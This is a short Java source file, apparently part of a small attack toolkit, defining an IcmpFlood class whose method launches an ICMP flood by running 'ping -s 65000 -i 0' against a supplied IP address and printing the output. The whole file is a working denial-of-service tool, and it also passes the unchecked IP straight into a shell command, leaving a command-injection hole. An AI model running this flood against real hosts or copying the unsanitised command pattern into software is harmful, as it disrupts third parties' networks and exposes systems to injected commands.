package Base;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

/**
 * @author Masaki Ihara
 * @version 1.0
 */
public class IcmpFlood extends Attack {

    /**
     * icmpAttack method
     *
     * Take the parameter as targetIp and perform ICMP Flood
     * by sending 65,000 bytes per pinging with 0 interval
     *
     * @param ip String value of IP address
     */
    public static void icmpAttack(String ip) {

        try {
            Runtime r = Runtime.getRuntime();
            // The maximum ping value (65,000 byte per pinging, without interval)
            Process p = r.exec("ping -s 65000 -i 0 " + ip);

            // Read in the output of executed command
            BufferedReader in = new BufferedReader(new InputStreamReader(p.getInputStream()));

            String inputLine;

            // Print out the output while the process keeps running
            while ((inputLine = in.readLine()) != null) {
                System.out.println(inputLine);
            }
            in.close();

        } catch (IOException e) {
            System.out.println("Error");
        }
    }
}
